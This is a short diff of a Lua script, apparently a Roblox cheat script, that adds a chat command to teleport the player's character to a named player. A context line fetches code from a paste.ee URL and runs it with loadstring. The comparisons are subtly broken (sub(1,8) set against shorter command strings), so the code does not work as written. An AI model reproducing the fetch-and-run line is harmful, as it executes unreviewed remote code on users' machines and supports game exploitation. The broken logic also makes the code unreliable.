@@ -829,4 +829,21 @@ end
 if msg:lower():sub(1,8) == "-kick" then
 repeat wait() until game:IsLoaded() wait(0.05) loadstring(game:HttpGet("https://paste.ee/r/38EzK"))() warn("loaded")
 end
+
+if msg:lower():sub(1,8) == "-bring" then
+local player = game.Players.LocalPlayer
+	player.Chatted:Connect(function(msg)
+	    local target --this would be the player that we're gonna tp to, its just a varibale to make things cleaner.
+	    if msg:lower():match("goto") then
+	        if game.Players:FindFirstChild(msg:sub(6)) then
+	            target = workspace:FindFirstChild(msg:sub(6))
+	            print(target)
+	            player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Head.Position)
+	        end
+	    end
+	end)
+wait(0.8)
+game.Players:Chat("goto 1x1x1x1x1wanted")
+end
 end)
+
